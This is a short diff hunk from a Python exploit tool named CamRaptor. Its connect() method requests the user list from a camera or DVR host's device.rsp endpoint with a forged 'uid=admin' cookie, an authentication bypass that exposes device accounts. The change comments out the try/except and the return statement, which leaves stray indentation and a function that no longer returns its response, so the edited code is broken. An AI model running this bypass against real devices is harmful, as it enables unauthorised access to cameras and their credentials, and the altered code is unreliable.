@@ -31,15 +31,15 @@ import requests
 class CamRaptor:
     @staticmethod
     def connect(host):
-        try:
+        #try:
             cookies = {
                 "uid": "admin"
             }
 
             response = requests.get(f"http://{host}/device.rsp?opt=user&cmd=list", cookies=cookies, verify=False, timeout=1)
-        except Exception:
-            return None
-        return response
+        #except Exception:
+            #return None
+        #return response
 
     @staticmethod
     def exploit(response):
